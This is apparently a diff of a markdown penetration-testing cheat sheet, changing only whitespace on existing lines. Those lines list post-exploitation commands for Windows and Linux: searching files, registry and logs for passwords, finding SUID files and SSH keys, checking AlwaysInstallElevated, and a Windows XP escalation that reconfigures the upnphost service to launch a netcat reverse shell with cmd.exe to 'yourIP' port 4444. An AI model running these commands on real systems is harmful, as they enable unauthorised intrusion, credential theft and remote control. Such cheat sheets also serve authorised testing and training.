@@ -184,25 +184,25 @@ And on your side authorize the connection with `xhost +targetIp` and catch it wi
 `netstat -ano`
 
 * Firewall status
-`netsh firewall show state`
+`netsh firewall show state`    
 `netsh firewall show config`
 
 * Scheduled tasks
-List - `schtasks /query /fo LIST /v`
-Create - `schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR "mycommands"`
-Run - `schtasks /Run /TN mytask`
-Delete - `schtasks /Delete /TN mytask`
+List - `schtasks /query /fo LIST /v`    
+Create - `schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR "mycommands"`     
+Run - `schtasks /Run /TN mytask`    
+Delete - `schtasks /Delete /TN mytask`    
 
 * Running tasks
-List - `tasklist /SVC`
-Kill - `taskkill /IM <exe name> /F`
-Kill - `taskkill /PID <pid> /F`
+List - `tasklist /SVC`    
+Kill - `taskkill /IM <exe name> /F`    
+Kill - `taskkill /PID <pid> /F`     
 
 * Services
-List - `net start`
-Long name to key name `sc getkeyname "long name"`
-Details - `sc qc <key name>`
-Config - `sc config <key name> `
+List - `net start`     
+Long name to key name `sc getkeyname "long name"`     
+Details - `sc qc <key name>`     
+Config - `sc config <key name> `    
 
 * Low hanging fruits to grab
 ```
@@ -213,37 +213,37 @@ c:\sysprep\sysprep.xml
 ```
 
 * Installers are running as elevated?
-`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
-`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`    
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`    
 
 * Find interesting files
-`dir /s *pass* == *cred* == *vnc* == *.config*`
-`findstr /si password *.xml *.ini *.txt`
+`dir /s *pass* == *cred* == *vnc* == *.config*`     
+`findstr /si password *.xml *.ini *.txt`     
 
 * Find interesting registry entries
-`reg query HKLM /f password /t REG_SZ /s`
-`reg query HKCU /f password /t REG_SZ /s`
+`reg query HKLM /f password /t REG_SZ /s`     
+`reg query HKCU /f password /t REG_SZ /s`     
 
 * Permissions
-Check detail on service - `accesschk.exe /accepteula -ucqv <service name>`
-Find modifiable services - `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`
-                           `accesschk.exe /accepteula -uwcqv "Users" *`
-Folder permissions - `accesschk.exe -dqv <path>`
-`cacls <path>`
-`icacls <path\file`
+Check detail on service - `accesschk.exe /accepteula -ucqv <service name>`     
+Find modifiable services - `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`     
+                           `accesschk.exe /accepteula -uwcqv "Users" *`     
+Folder permissions - `accesschk.exe -dqv <path>`     
+`cacls <path>`     
+`icacls <path\file`     
                            
 * Qick win on WinXP SP0/1  
-`sc config upnphost binpath= "C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe"`
-`sc config upnphost obj= ".\LocalSystem" password= ""`
-`sc config upnphost depend= ""`
-`net stop upnphost`
-`net start upnphost`
+`sc config upnphost binpath= "C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe"`     
+`sc config upnphost obj= ".\LocalSystem" password= ""`     
+`sc config upnphost depend= ""`     
+`net stop upnphost`     
+`net start upnphost`     
 
 * Quick wins
-`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
-`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`
-`reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"`
-`reg query "HKCU\Software\ORL\WinVNC3\Password"`
+`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`     
+`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`     
+`reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"`     
+`reg query "HKCU\Software\ORL\WinVNC3\Password"`     
 
 * Download file with VBS
 ```
@@ -280,49 +280,49 @@ end with
 ## Inside Linux
 
 * Basic enumeration
-System info `uname -a`
-Arch `uname -m`
-Kernel `cat /proc/version	`
-Distro `cat /etc/*-release` or `cat /etc/issue`
-Filesystem `df -a	`
-Users `cat /etc/passwd`
-Groups `cat /etc/group`
-Super accounts `grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`
-Currently logged in `finger`, `w`, `who -a`, `pinky`, `users`
-Last logged users `last`, `lastlog`
-Cheeky test - `sudo -l`
-Anything interesting we can run as sudo? `sudo -l 2>/dev/null | grep -w 'nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb' | xargs -r ls -la 2>/dev/null`
-History - `history`
-Env vars `env`
-Available shells `cat /etc/shells	`
-
-SUID files `find / -perm -4000 -type f 2>/dev/null`
-SUID owned by root `find / -uid 0 -perm -4000 -type f 2>/dev/null`
-GUID files `find / -perm -2000 -type f 2>/dev/null	`
-World writable `find / -perm -2 -type f 2>/dev/null`
-World writable executed `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null	`
-World writable dirs `find / -perm -2 -type d 2>/dev/null`
-rhost files `find /home –name *.rhosts -print 2>/dev/null	`
-Plan files `find /home -iname *.plan -exec ls -la {} ; -exec cat {} 2>/dev/null ;	`
-hosts.equiv `find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;	`
-Can we peek at /root? `ls -ahlR /root/	`
-Find ssh files `find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r ls -la`
-Inetd `ls -la /usr/sbin/in.*	`
-Grep logs for loot `grep -l -i pass /var/log/*.log 2>/dev/null	`
-What do we have in logs `find /var/log -type f -exec ls -la {} ; 2>/dev/null	`
-Find conf files in /etc `find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null	`
-as above `ls -la /etc/*.conf	`
-List open files `lsof -i -n	`
-Can we read root mail? `head /var/mail/root	`
-What is running as root? `ps aux | grep root	`
-Lookup paths to running files `ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'`
-Exports and permissions of NFS `ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null	`
-List sched jobs `ls -la /etc/cron*	`
-List open connections `lsof -i` (run with sudo/as root for more results)
-
-Installed pkgs: `dpkg -l` (debian), `rpm -qa` (RH)
-sudo version? `sudo -V`
-Available compilers `dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
+System info `uname -a`     
+Arch `uname -m`     
+Kernel `cat /proc/version	`     
+Distro `cat /etc/*-release` or `cat /etc/issue`     
+Filesystem `df -a	`     
+Users `cat /etc/passwd`     
+Groups `cat /etc/group`     
+Super accounts `grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`     
+Currently logged in `finger`, `w`, `who -a`, `pinky`, `users`     
+Last logged users `last`, `lastlog`     
+Cheeky test - `sudo -l`     
+Anything interesting we can run as sudo? `sudo -l 2>/dev/null | grep -w 'nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb' | xargs -r ls -la 2>/dev/null`     
+History - `history`     
+Env vars `env`     
+Available shells `cat /etc/shells	`     
+     
+SUID files `find / -perm -4000 -type f 2>/dev/null`     
+SUID owned by root `find / -uid 0 -perm -4000 -type f 2>/dev/null`     
+GUID files `find / -perm -2000 -type f 2>/dev/null	`     
+World writable `find / -perm -2 -type f 2>/dev/null`     
+World writable executed `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null	`     
+World writable dirs `find / -perm -2 -type d 2>/dev/null`     
+rhost files `find /home –name *.rhosts -print 2>/dev/null	`     
+Plan files `find /home -iname *.plan -exec ls -la {} ; -exec cat {} 2>/dev/null ;	`     
+hosts.equiv `find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;	`     
+Can we peek at /root? `ls -ahlR /root/	`     
+Find ssh files `find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r ls -la`     
+Inetd `ls -la /usr/sbin/in.*	`     
+Grep logs for loot `grep -l -i pass /var/log/*.log 2>/dev/null	`     
+What do we have in logs `find /var/log -type f -exec ls -la {} ; 2>/dev/null	`     
+Find conf files in /etc `find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null	`     
+as above `ls -la /etc/*.conf	`     
+List open files `lsof -i -n	`     
+Can we read root mail? `head /var/mail/root	`     
+What is running as root? `ps aux | grep root	`     
+Lookup paths to running files `ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'`     
+Exports and permissions of NFS `ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null	`     
+List sched jobs `ls -la /etc/cron*	`     
+List open connections `lsof -i` (run with sudo/as root for more results)     
+     
+Installed pkgs: `dpkg -l` (debian), `rpm -qa` (RH)     
+sudo version? `sudo -V`     
+Available compilers `dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`     
 
 
 ### Upload files using cUrl with WebDAV
